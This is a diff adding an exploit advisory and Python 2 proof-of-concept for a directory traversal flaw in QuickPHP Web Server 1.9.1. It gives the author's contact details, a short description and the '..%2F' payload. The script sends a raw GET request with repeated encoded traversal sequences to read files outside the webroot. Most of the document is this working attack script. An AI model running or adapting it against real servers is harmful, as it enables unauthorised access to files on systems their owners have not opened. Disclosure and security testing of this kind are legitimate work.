@@ -1,0 +1,53 @@
+# ------------------------------------------------------------------------
+
+# Software................QuickPHP Web Server 1.9.1
+
+# Vulnerability...........Directory Traversal
+
+# Download................http://www.zachsaw.co.cc/?pg=quickphp_php_tester_debugger
+
+# Release Date............12/27/2010
+
+# Tested On...............Windows XP
+
+# ------------------------------------------------------------------------
+
+# Author..................John Leitch
+
+# Site....................http://www.johnleitch.net/
+
+# Email...................john.leitch5@gmail.com
+
+# ------------------------------------------------------------------------
+
+# 
+
+# --Description--
+# 
+# A directory traversal vulnerability in QuickPHP Web Server 1.9.1 can
+# be exploited to read files outside of the webroot directory.
+# 
+# 
+# --Exploit--
+# 
+# The resource path must be absolute.
+# 
+# ..%2F
+# 
+# 
+# --PoC--
+
+
+
+import socket
+
+host = 'localhost'
+port = 80
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(8)
+s.connect((host, port))
+s.send('GET http://' + host + '/' + '..%2F' * 8 + ' HTTP/1.1\r\n'
+       'Host: ' + host + '\r\n\r\n');
+
+print s.recv(8192);
